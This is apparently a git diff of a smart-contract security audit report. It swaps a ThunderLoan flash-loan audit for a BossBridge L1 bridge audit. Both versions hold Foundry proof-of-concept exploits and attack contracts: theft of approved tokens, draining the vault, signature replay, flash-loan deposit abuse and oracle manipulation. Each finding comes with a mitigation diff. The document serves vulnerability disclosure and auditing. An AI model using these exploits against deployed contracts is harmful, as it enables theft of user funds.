@@ -1,7 +1,7 @@
 ---
 title: Protocol Audit Report
 author: Seven Cedars
-date: June 4, 2024
+date: June 10, 2024
 header-includes:
   - \usepackage{titling}
   - \usepackage{graphicx}
@@ -19,7 +19,7 @@ NB: remeber to run this in the audit_data folder!
         \includegraphics[width=0.5\textwidth]{logo.pdf} 
     \end{figure}
     \vspace*{2cm}
-    {\Huge\bfseries ThunderLoan Audit Report\par}
+    {\Huge\bfseries BossBridge Audit Report\par}
     \vspace{1cm}
     {\Large Version 1.0\par}
     \vspace{2cm}
@@ -38,26 +38,28 @@ Lead Auditors: Seven Cedars
 # Table of Contents
 - [Table of Contents](#table-of-contents)
 - [Protocol Summary](#protocol-summary)
-- [Disclaimer](#disclaimer)
 - [Risk Classification](#risk-classification)
 - [Audit Details](#audit-details)
   - [Scope](#scope)
-  - [Roles](#roles)
+  - [Actors/Roles](#actorsroles)
 - [Executive Summary](#executive-summary)
   - [Issues found](#issues-found)
 - [Findings](#findings)
+  - [High](#high)
+    - [\[H-1\] In the `L1BossBridge::depositTokensToL2` function an arbitrary `from` address is passed into `safeTransferFrom`. It allows a malicious user to transfer tokens that have been approved by another user to the vault, setting `l2Recipient` in the procces and stealing the related L2 tokens.](#h-1-in-the-l1bossbridgedeposittokenstol2-function-an-arbitrary-from-address-is-passed-into-safetransferfrom-it-allows-a-malicious-user-to-transfer-tokens-that-have-been-approved-by-another-user-to-the-vault-setting-l2recipient-in-the-procces-and-stealing-the-related-l2-tokens)
+    - [\[H-2\] By setting `from` in the `L1BossBridge::depositTokensToL2` function as `address(vault)` and `l2Recipient` as the attacker address, it is possible to mint an almost unlimited amount of L2 tokens.](#h-2-by-setting-from-in-the-l1bossbridgedeposittokenstol2-function-as-addressvault-and-l2recipient-as-the-attacker-address-it-is-possible-to-mint-an-almost-unlimited-amount-of-l2-tokens)
+    - [\[H-3\] The `L1BossBridge::sendToL1` is vulnerable to replay signature attacks, because it lacks a check if a signature has already been used. It means that a signature can be used an unlimited times to retrieve L1 tokens.](#h-3-the-l1bossbridgesendtol1-is-vulnerable-to-replay-signature-attacks-because-it-lacks-a-check-if-a-signature-has-already-been-used-it-means-that-a-signature-can-be-used-an-unlimited-times-to-retrieve-l1-tokens)
+    - [\[H-4\] The `L1BossBridge::sendToL1` function does not check the values extracted from `message` before using them to send eth to recipient address by placing a low level `.call`. This allows a malicious user to sent large amounts of eth to their own address, or create a DoS by executing a function with immense gas cost.](#h-4-the-l1bossbridgesendtol1-function-does-not-check-the-values-extracted-from-message-before-using-them-to-send-eth-to-recipient-address-by-placing-a-low-level-call-this-allows-a-malicious-user-to-sent-large-amounts-of-eth-to-their-own-address-or-create-a-dos-by-executing-a-function-with-immense-gas-cost)
 
 # Protocol Summary
-The ThunderLoan protocol is meant to do the following:
+This project presents a simple bridge mechanism to move our ERC20 token from L1 to an L2 we're building.
+The L2 part of the bridge is not included. 
 
-1. Give users a way to create flash loans
-2. Give liquidity providers a way to earn money off their capital
-   
-Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans. 
+The bridge allows users to deposit tokens, which are held into a secure vault on L1. Successful deposits trigger an event that our off-chain mechanism picks up, parses it and mints the corresponding tokens on L2.
 
-# Disclaimer
+To ensure user safety, this first version of the bridge has a few security mechanisms in place:
 
-The team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.
+The developers plan on launching `L1BossBridge` on both Ethereum Mainnet and ZKSync. 
 
 # Risk Classification
 
@@ -73,645 +75,293 @@ We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate
 # Audit Details 
 
 ## Scope 
-- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
-- In Scope:
+
+- Commit Hash: 07af21653ab3e8a8362bf5f63eb058047f562375
+- In scope
+
 ```
-#-- interfaces
-|   #-- IFlashLoanReceiver.sol
-|   #-- IPoolFactory.sol
-|   #-- ITSwapPool.sol
-|   #-- IThunderLoan.sol
-#-- protocol
-|   #-- AssetToken.sol
-|   #-- OracleUpgradeable.sol
-|   #-- ThunderLoan.sol
-#-- upgradedProtocol
-    #-- ThunderLoanUpgraded.sol
+./src/
+#-- L1BossBridge.sol
+#-- L1Token.sol
+#-- L1Vault.sol
+#-- TokenFactory.sol
 ```
 - Solc Version: 0.8.20
-- Chain(s) to deploy contract to: Ethereum
-- ERC20s:
-  - USDC 
-  - DAI
-  - LINK
-  - WETH
+- Chain(s) to deploy contracts to:
+  - Ethereum Mainnet: 
+    - L1BossBridge.sol
+    - L1Token.sol
+    - L1Vault.sol
+    - TokenFactory.sol
+  - ZKSync Era:
+    - TokenFactory.sol
+  - Tokens:
+    - L1Token.sol (And copies, with different names & initial supplies)
 
-## Roles
-- Owner: The owner of the protocol who has the power to upgrade the implementation. 
-- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
-- User: A user who takes out flash loans from the protocol.
+## Actors/Roles
+
+- Bridge Owner: A centralized bridge owner who can:
+  - pause/unpause the bridge in the event of an emergency
+  - set `Signers` (see below)
+- Signer: Users who can "send" a token from L2 -> L1. 
+- Vault: The contract owned by the bridge that holds the tokens. 
+- Users: Users mainly only call `depositTokensToL2`, when they want to send tokens from L1 -> L2. 
   
 # Executive Summary
+I only focused on high risk vulnerabilities for this report. 
 
 | Severity | Number of Issues found |
 | -------- | ---------------------- |
-| high     | 3                      |
-| medium   | 2                      |
-| low      | 2                      |
-| info     | 7                      |
-| gas      | 1                      |
-| total    | 15                     |
+| high     | 4                      |
+| medium   | 0                      |
+| low      | 0                      |
+| total    | 4                      |
 
 
 ## Issues found
 # Findings
-
 ## High
-### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees that is actually the case, that blocks redemptions and incorrectly sets the exchange rate. 
 
-**Description:** In the `ThunderLoan` protocol, the `exchangeRate` is used to calculate the exchange rate between assetTokens and their underlying tokens. Indirectly, it keeps track of how many fees liquidity providers should receive. 
+### [H-1] In the `L1BossBridge::depositTokensToL2` function an arbitrary `from` address is passed into `safeTransferFrom`. It allows a malicious user to transfer tokens that have been approved by another user to the vault, setting `l2Recipient` in the procces and stealing the related L2 tokens.  
 
-However, the `deposit` function erroneously updates this state - without collecting any fees. 
+**Description:** The `depositTokensToL2` is meant to allow a user to deposit L1 tokens to the L1Vault and receive L2 tokens in return. To do this, the function takes a `from` field (the user sending the funds), a `l2Recipient` address (the user receiving the L2 tokens) and an `amount` value (the humber of tokens to send and receive). 
+
+However, because the `from` address can be set to any address, it is possible for a malicious user Bob to send tokens that have previously been approved for transfer by benevolent user Alice. Doing so, Bob can set the `l2Recipient` address to his own address and send the maximum approved amount of tokens as `amount`. 
 
 ```javascript 
-    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
-        AssetToken assetToken = s_tokenToAssetToken[token];
-        uint256 exchangeRate = assetToken.getExchangeRate();
-        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
-        emit Deposit(msg.sender, token, amount);
-        assetToken.mint(msg.sender, mintAmount);
+@>  function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
+            revert L1BossBridge__DepositLimitReached();
+        }
+        token.safeTransferFrom(from, address(vault), amount);
 
-@>        uint256 calculatedFee = getCalculatedFee(token, amount);
-@>        assetToken.updateExchangeRate(calculatedFee);
-
-        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+@>      emit Deposit(from, l2Recipient, amount);
     }
 ```
 
-**Impact:** There are several impacts of this bug. 
-
-1. The `redeem` function is potentially blocked because the protocol, bacause it can try to return more tokens than it has. 
-2. Rewards are incorrectly calculated, leading to users getting potentially more or less than they deserve. 
+**Impact:** When a malicious user calls the `depositTokensToL2` function with someone elses tokens, it results in a `Deposit` event being emitted that will tell the bridge to transfer the equivalent amount of L2 tokens to the malicious user. In effect, the malicious user is stealing all L2 tokens from the benevolent user.    
 
 **Proof of Concept:**
-1. LP depsoits
-2. User takes out a flash loan
-3. It is now possible for LP to redeem.  
+1. Benevolent user Alice approves tokens. 
+2. Malicious user Bob depositTokensToL2 Alice's tokens to `depositTokensToL2` while setting `l2Recipient` to his own address and `amount` to all tokens Alice holds. 
+3. An event is emitted that has Bob's address as recipient, with all of Alice's tokens now in the L1 vault. 
 
 <details>
 <summary> Proof of Concept</summary>
 
-Place the following in `ThunderLoanTest.t.sol`
+Place the following in `L1TokenBridge.t.sol`
 
 ```javascript
-     function testRedeemAfterLoan() public  setAllowedToken hasDeposits {
-        uint256 amountToBorrow = AMOUNT * 10;
-        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
-
+    function testCanMoveApprovedTokensOfOtherUsers() public {
+        // Alice
         vm.startPrank(user);
-        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
-        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
-        vm.stopPrank();
+        token.approve(address(tokenBridge), type(uint256).max); 
 
-        uint256 amountToRedeem = type(uint256).max ;
-        vm.startPrank(liquidityProvider);
-        thunderLoan.redeem(tokenA, amountToRedeem);  
-    }
+        // Bob
+        uint256 depositAmount = token.balanceOf(user); 
+        address attacker = makeAddr("attacker"); 
+        vm.startPrank(attacker); 
+        vm.expectEmit(address(tokenBridge)); 
+        emit Deposit(user, attacker, depositAmount); 
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount); 
+
+        assertEq(token.balanceOf(user), 0); 
+        assertEq(token.balanceOf(address(vault)), depositAmount); 
+        vm.stopPrank(); 
+    } 
 ```
-
 </details>
 
-**Recommended Mitigation:** Remove the incorrect update exchange rate lines from `deposit`. 
-
+**Recommended Mitigation:** 
+Do not pass an arbitrary value into the `from` address. It is better to use `msg.sender` as a value.  
 ```diff 
-    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
-        AssetToken assetToken = s_tokenToAssetToken[token];
-        uint256 exchangeRate = assetToken.getExchangeRate();
-        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
-        emit Deposit(msg.sender, token, amount);
-        assetToken.mint(msg.sender, mintAmount);
++  function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
+-  function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
+            revert L1BossBridge__DepositLimitReached();
+        }
++        token.safeTransferFrom(msg.sender, address(vault), amount);
+-        token.safeTransferFrom(from, address(vault), amount);
 
--        uint256 calculatedFee = getCalculatedFee(token, amount);
--        assetToken.updateExchangeRate(calculatedFee);
-
-        token.safeTransferFrom(msg.sender, address(assetToken), amount);
++      emit Deposit(msg.sender, l2Recipient, amount);
+-      emit Deposit(from, l2Recipient, amount);
     }
+
 ```
 
-### [H-2] The `ThunderLoan::deposit` function can be called with borrowed money from `ThunderLoan::flashloan`, allowing draining of all funds through taking fees and exchange rate manipulation.
+### [H-2] By setting `from` in the `L1BossBridge::depositTokensToL2` function as `address(vault)` and `l2Recipient` as the attacker address, it is possible to mint an almost unlimited amount of L2 tokens. 
 
-**Description:** 
-It is possible to borrow tokens via the `flashloan` function and desposit them via the `deposit` function; bypassing the `repay` function. It is possible because the protocol checks if the flashloan has been repaid by comparing the start and end balance of the token. This end balance can also be the same by depositing (instead of repaying) the token.   
+**Description:** As noted above, the `depositTokensToL2` is meant to allow a user to deposit L1 tokens to the L1Vault and receive L2 tokens in return. To do this, the function takes a `from` field (the user sending the funds), a `l2Recipient` address (the user receiving the L2 tokens) and an `amount` value (the humber of tokens to send and receive). 
+
+However, in addition to the `from` field taking an arbitrary value (see the issue [H-1] above): 
+
+First, the L1 vault is given full approval over all its tokens in its vault at time of construction of the vault: 
 
 ```javascript
-    uint256 endingBalance = token.balanceOf(address(assetToken));
-    if (endingBalance < startingBalance + fee) {
-        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
+    constructor(IERC20 _token) Ownable(msg.sender) {
+        token = _token;
+        vault = new L1Vault(token);
+@>      vault.approveTo(address(this), type(uint256).max);
     }
 ```
 
-**Impact:** 
-When borrowed tokens are redeposited (instead of repaid) in this way, the value of the `assetToken` linked to the underlying is artifically increased: new `assetToken`s are minted without additional underlying tokens being added to the `ThunderLoan` contract. It results in tokens being drained from the asset pool.
+Second, the documentation notes that "Successful deposits trigger an event that our off-chain mechanism picks up, parses it and *mints the corresponding tokens on L2*". 
+
+**Impact:** Together, the above issues allow a malicious user to enter `address(vault)` as the from address, and have it send the full amount deposited in the vault to itself, trigger a `Deposit` event and have the corresponding amount of L2 tokens minted and send to their address. A malicious user can repeat this process indefinitely. 
 
 **Proof of Concept:**
-1. ThunderLoan has 100e18 of tokenA as asset, with 100e18 `assetToken`s as collateral.    
-2. Malicious userZero takes a flashLoan of 50e18 to external contractB. 
-3. ContractB deposits the borrowed tokens through the `deposit` function, receiving newly minted `assetToken`s. 
-4. This causes the exchange rate between the `assetToken` and the underlying token to increase.
-5. ContractB does not call the repay function, but because the ending balance is higher than starting balance; the call does not revert. 
-6. Finally, ContractB calls the `redeem` function with the its assetTokens and receives more underlying tokens than were borrowed initially. 
+1. Malicious user calls the `depositTokensToL2` with the vaults full balance and the attacker's address as `l2Recipient`.
+2. The transaction passes. 
+3. A `Deposit` event is emitted, with attacker's address as recipient. 
 
 <details>
 <summary> Proof of Concept</summary>
 
-Place the following two in `ThunderLoanTest.t.sol`:  
-
+Place the following in `L1TokenBridge.t.sol`
 ```javascript
-    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
-        vm.startPrank(user); 
-        uint256 amountToBorrow = 50e18; 
-        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
-        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan)); 
-        tokenA.mint(address(dor), fee); 
-        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, ""); 
-        dor.redeemMoney();
-        vm.stopPrank(); 
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance); 
+
+        // the following should trigger deposit event. 
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance); 
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
+    }
+```
+</details>
+
+**Recommended Mitigation:** There are several mitigation that can be implemented. 
+1. Do not pass an arbitrary value to the `from` field. See also vulnerability [H-1] above. 
+2. Disallow `address(vault)` to deposit tokens altogether. In addition to the changes proposed above: 
+
+```diff 
+  function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
+        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
+            revert L1BossBridge__DepositLimitReached();
+        }
++        if (msg.sender == address(vault)) {
++            revert L1BossBridge__VaultCannotDeposit();
++        }
+
+        token.safeTransferFrom(msg.sender, address(vault), amount);
+
+      emit Deposit(msg.sender, l2Recipient, amount);
+    }
+
+```
+
+3. It is also possible to restrict transfer approvals, but this will trigger a broader refactoring of the code base.   
+
+### [H-3] The `L1BossBridge::sendToL1` is vulnerable to replay signature attacks, because it lacks a check if a signature has already been used. It means that a signature can be used an unlimited times to retrieve L1 tokens.
+
+**Description:** The `sendToL1` function is meant to allow a central signer to approve and execute retrievals of L1 tokens following the deposit of L2 tokens. To do this, it takes the `v`, `r` and `s` values as signature of the `L1BossBridge` signer, and a `message` field that contains the abi.encoded function call to transfer L1 tokens to the user. 
+
+However, the `sendToL1` function lacks a check if the signature has been used before. Because the signature is send over chain, it can be copied by a malicious user. This user can use these values to authorize subsequent calls to the `sendToL1` function indefinitely. 
+
+**Impact:** As a malicious user can use a legitimate signature to withdraw L1 tokens indefinitely, it allows all assets to be drained from the vault. 
+
+**Proof of Concept:** 
+1. A malicious user makes a legit deposit to `depositTokensToL2`. 
+2. This triggers the operator of the vault to sign a message for the function `withdrawTokensToL1`. 
+3. The malicious user copies the resulting signature and replays the call to `withdrawTokensToL1` until all funds are drained. 
+
+<details>
+<summary> Proof of Concept</summary>
+
+Place the following in `L1TokenBridge.t.sol`
+```javascript
+    function testSignatureReplay() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultInitialBalance = 100e18; 
+        uint256 attackerInitialBalance = 100e18; 
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), address(attacker), attackerInitialBalance); 
+
+        // an attacker deposits tokens to L2. 
+        vm.startPrank(attacker); 
+        token.approve(address(tokenBridge), type(uint256).max); 
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance); 
+
+        //signer/operator signs withdrawal
+        bytes memory message = abi.encode(
+            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+        ); 
+        (uint8 v, bytes32 r, bytes32 s) = 
+            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message))); 
         
-        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee); 
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s); 
+        }
+
+        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance); 
+        assertEq(token.balanceOf(address(vault)), 0); 
     }
 ```
-
-As well as: 
-
-```javascript
-    contract DepositOverRepay is IFlashLoanReceiver { 
-        ThunderLoan thunderLoan; 
-        AssetToken assetToken; 
-        IERC20 s_token; 
-
-        constructor(address _thunderLoan) {
-            thunderLoan = ThunderLoan(_thunderLoan); 
-        }
-
-        function executeOperation(
-            address token,
-            uint256 amount,
-            uint256 fee,
-            address /*initiator*/,
-            bytes calldata /*params*/
-        )
-            external
-            returns (bool)
-        {
-            s_token = IERC20(token); 
-            assetToken = thunderLoan.getAssetFromToken(IERC20(token)); 
-            IERC20(token).approve(address(thunderLoan), amount + fee); 
-            thunderLoan.deposit(IERC20(token), amount + fee); 
-            return true; 
-        }
-
-        function redeemMoney() public {
-            uint256 amount = assetToken.balanceOf(address(this)); 
-            thunderLoan.redeem(s_token, amount); 
-        }
-    }
-```
-
 </details>
 
-
-**Recommended Mitigation:** the `flashLoan` function needs to check if the `repay` function is called. This can be done by setting `s_currentlyFlashLoaning` to false inside the `repay` function instead of the `flashLoan` function. 
-
-Thus, at the end of `flashloan`: 
-```diff
-    uint256 endingBalance = token.balanceOf(address(assetToken));
-    if (endingBalance < startingBalance + fee) {
-        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
-    }
--    s_currentlyFlashLoaning[token] = false;
-
-```
-
-And subsequently at `repay`: 
-```diff 
-    function repay(IERC20 token, uint256 amount) public {
-        if (!s_currentlyFlashLoaning[token]) {
-            revert ThunderLoan__NotCurrentlyFlashLoaning();
-        }
-        AssetToken assetToken = s_tokenToAssetToken[token];
-        token.safeTransferFrom(msg.sender, address(assetToken), amount);
-+       s_currentlyFlashLoaning[token] = false;
-    }
-```
-
-This will cause the flashLoan to keep open as long as the token has not been actually repaid.
-
-### [H-3] Mixing up variable location causes storage collision in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol.
-
-**Description:** 
-`ThunderLoan.sol` has two storage variables in the following order: 
-
-```javascript
-    uint256 private s_feePrecision; 
-    uint256 private s_flashLoanFee; 
-```
-
-However, `ThunderLoanUpgraded.sol` has them in a different order. 
-
-```javascript
-    uint256 private s_flashLoanFee;  
-    uint256 public constant FEE_PRECISION = 1e18;
-```
-
-Due to how solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, also breaks storage location. 
-
-**Impact:** 
-After the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. As a result, users will pay the wrong fee. Worse, the `s_currentlyFlashLoaning` starts in the wrong stroage slot, breaking the protocol. 
-
-**Proof of Concept:**
-1. Initial contract is deployed. 
-2. Owner of contract deploys upgrade. 
-3. Fee structure breaks.  
-
-<detail> 
-<summary> Proof of Concept </summary> 
-
-Place the following in `ThunderLoanTest.t.sol`. 
-
-```javascript
-    import { ThunderLoanUpgraded } from  "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
-
-    function testUpgradesBreaks() public {
-        uint256 feeBeforeUpgrade = thunderLoan.getFee(); 
-        vm.startPrank(thunderLoan.owner()); 
-        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
-        thunderLoan.upgradeToAndCall(address(upgraded), ""); 
-        uint256 feeAfterUpgrade = thunderLoan.getFee(); 
-        vm.stopPrank(); 
-
-        console2.log("fee before upgrade:", feeBeforeUpgrade);  
-        console2.log("fee after upgrade:", feeAfterUpgrade); 
-
-        assert(feeBeforeUpgrade != feeAfterUpgrade); 
-    }  
-```
-
-You can also see the storage difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`. 
-</detail>
-
-**Recommended Mitigation:** If you must remove the storage variable, leave it blank to avoid mixing storage slots.  
+**Recommended Mitigation:** Add a state variable to keep track what signatures have been used, and adding a check to disallow reuse of signatures. 
 
 ```diff 
--    uint256 private s_flashLoanFee; 
--    uint256 public constant FEE_PRECISION = 1e18;
-+    int256 private s_blank;
-+    int256 private s_flashLoanFee;
-+    uint256 public constant FEE_PRECISION = 1e18;
++   mapping(bytes signature => bool hasBeenUsed) public usedSignatures; // users that can send l1 -> l2 
+.
+.
+.
++   error L1BossBridge__ReuseSignatureNotAllowed();
+.
+.
+.   
+    function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
+        bytes memory signature = abi.encodePacked(r, s, v)
+        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
 
-```
-
-## Medium 
-
-### [M-1] Using Tswap as price Oracle allows for Oracle manipulation and to users being able to get lower borrowing fees. 
-
-**Description:** At `getCalculatedFee` the fee is calculated in wrappedEthed (Weth), using the `TSwap` protocol as price Oracle. However, the exchange rate at `TSwap` can be manipulated by adding (borrowed) tokens to the `Tswap` exchange pool.  
-
-**Impact:** As the exchange rate at the `TSwap` protocol is artifically decreased, a user will pay lower fees for their flashloan.  
-
-**Proof of Concept:**
-1. Malicious user takes out a first flashLoan of TokenA. 
-2. The user deposits the flashloan to the `Tswap` protocol. 
-3. Malicious user takes out a second flashloan of TokanA. 
-4. The user pays far lower fees for the second flashloan.   
-5. On average the user paid lower fees than they would other wise have. 
-
-<detail> 
-<summary> Proof of Concept </summary> 
-
-Place the following code in `ThunderLoanTest.t.sol`.
-
-```javascript
-    function testOracleManipulation() public {
-        thunderLoan = new ThunderLoan(); 
-        tokenA = new ERC20Mock(); 
-        proxy = new ERC1967Proxy(address(thunderLoan), ""); 
-        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth)); 
-        address tswapPool = pf.createPool(address(tokenA)); 
-
-        thunderLoan = ThunderLoan(address(proxy));
-        thunderLoan.initialize(address(pf)); 
-
-        // 2. fund tswap
-        vm.startPrank(liquidityProvider); 
-        tokenA.mint(liquidityProvider, 100e18); 
-        tokenA.approve(address(tswapPool), 100e18); 
-        weth.mint(liquidityProvider, 100e18); 
-        weth.approve(address(tswapPool), 100e18); 
-        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp); 
-        vm.stopPrank();
-        // ratio = 1 to 1. 
-
-        // 3. fund Thunderloan
-        vm.prank(thunderLoan.owner());
-        thunderLoan.setAllowedToken(tokenA, true); 
-        
-        vm.startPrank(liquidityProvider);
-        tokenA.mint(liquidityProvider, 1000e18); 
-        tokenA.approve(address(thunderLoan), 1000e18); 
-        thunderLoan.deposit(tokenA, 1000e18); 
-        vm.stopPrank();
-
-        // 4. get two flashloans. 
-        //     a. to influence price of weth/tokenA on Tswap 
-        //     b. to show that doing this results in reduced fees on thunderloan. 
-        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18); 
-        console2.log("normal fee is: ", normalFeeCost); 
-        //0.296147410319118389 
-
-        uint256 amountToBorrow = 50e18; 
-        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
-            address(tswapPool), 
-            address(thunderLoan),
-            address(thunderLoan.getAssetFromToken(tokenA)) 
-        );
-
-        vm.startPrank(user); 
-        tokenA.mint(address(flr), 100e18); 
-        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, ""); 
-        vm.stopPrank(); 
-
-        uint256 attackFee = flr.feeOne() + flr.feeTwo(); 
-        console2.log("attack fee is:", attackFee); 
-
-        assert(attackFee < normalFeeCost); 
-    }
-```
-
-As well as the attack contract: 
-
-```javascript
-contract MaliciousFlashLoanReceiver is IFlashLoanReceiver { 
-    ThunderLoan thunderLoan; 
-    address repayAddress; 
-    BuffMockTSwap tswapPool; 
-    bool attacked; 
-    uint256 public feeOne; 
-    uint256 public feeTwo; 
-
-    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
-        tswapPool = BuffMockTSwap(_tswapPool); 
-        thunderLoan = ThunderLoan(_thunderLoan); 
-        repayAddress = _repayAddress; 
-    }
-
-    function executeOperation(
-        address token,
-        uint256 amount,
-        uint256 fee,
-        address /*initiator*/,
-        bytes calldata /*params*/
-    )
-        external
-        returns (bool)
-    {
-        if (!attacked) {
-            feeOne = fee;
-            attacked = true; 
-            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18); 
-            IERC20(token).approve(address(tswapPool), 50e18); 
-            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp); 
-            // this tanks the price. 
-
-            // now getting a second flashloan. 
-            thunderLoan.flashloan(address(this), IERC20(token), amount, ""); 
-            // repay
-            // IERC20(token).approve(address(thunderLoan), amount + fee); 
-            // thunderLoan.repay(IERC20(token), amount + fee); 
-            IERC20(token).transfer(address(repayAddress), amount + fee); 
-
-        } else {
-            // calculate fee -> to compare with previous fee. 
-            feeTwo = fee; 
-            // repay
-            // IERC20(token).approve(address(thunderLoan), amount + fee); 
-            // thunderLoan.repay(IERC20(token), amount + fee); 
-            IERC20(token).transfer(address(repayAddress), amount + fee); 
+        if (!signers[signer]) {
+            revert L1BossBridge__Unauthorized();
         }
-        return true; 
-    }
-}
 
-```
++       if (usedSignatures[signature]) {
++           revert L1BossBridge__ReuseSignatureNotAllowed();
++       }
++       usedSignatures[signature] = true; 
 
-</detail>
 
-**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. This will involve some considerable refactoring of the code base. 
-
-### [M-2] `ThunderLoan::getCalculatedFee` calculates the fee in weth, but subsequently combines it with token amounts in payments. It results in users paying incorrect fees. 
-
-**Description:** The `getCalculatedFee` function calculates fees in weth: 
-
-```javascript
-    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
-    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
-```
-
-However, this fee is collected as a token - not as weth - in the `flashloan` function: 
-```javascript
-    if (endingBalance < startingBalance + fee) {
-        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
+        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
+        (bool success,) = target.call{ value: value }(data);
+        if (!success) {
+            revert L1BossBridge__CallFailed();
+        }
     }
 ```
 
-**Impact:** The fees paid by users will be incorrect any time the exchange rate between weth and the token is not 1 to 1.  
+### [H-4] The `L1BossBridge::sendToL1` function does not check the values extracted from `message` before using them to send eth to recipient address by placing a low level `.call`. This allows a malicious user to sent large amounts of eth to their own address, or create a DoS by executing a function with immense gas cost.  
 
-**Recommended Mitigation:** Remove calculation of fees in weth. Have users pay their fees in the token that is borrowed. This also resolves any issues with price manipulation mentioned in issue [M-1] discussed above.
+**Description:** As mentioned above, the `sendToL1` function is meant to allow a central signer to approve and execute retrievals of L1 tokens following the deposit of L2 tokens. To do this, it takes the `v`, `r` and `s` values as signature of the `L1BossBridge` signer, and a `message` field that contains the abi.encoded function call to transfer L1 tokens to the user. 
 
-## Low 
-### [L-1]: Centralization Risk for trusted owners
-
-The protocol restricts function by owner: giving a single owner privileged rights to perform admin tasks. As a consequence, the owner needs to be trusted to not perform malicious updates or drain funds.
-
-<details><summary>6 Found Instances</summary>
-- Found in src/protocol/ThunderLoan.sol [Line: 264](src/protocol/ThunderLoan.sol#L264)
-
-	```javascript
-	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
-	```
-
-- Found in src/protocol/ThunderLoan.sol [Line: 299](src/protocol/ThunderLoan.sol#L299)
-
-	```javascript
-	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
-	```
-
-- Found in src/protocol/ThunderLoan.sol [Line: 329](src/protocol/ThunderLoan.sol#L329)
-
-	```javascript
-	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
-	```
-
-- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 238](src/upgradedProtocol/ThunderLoanUpgraded.sol#L238)
-
-	```javascript
-	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
-	```
-
-- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 264](src/upgradedProtocol/ThunderLoanUpgraded.sol#L264)
-
-	```javascript
-	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
-	```
-
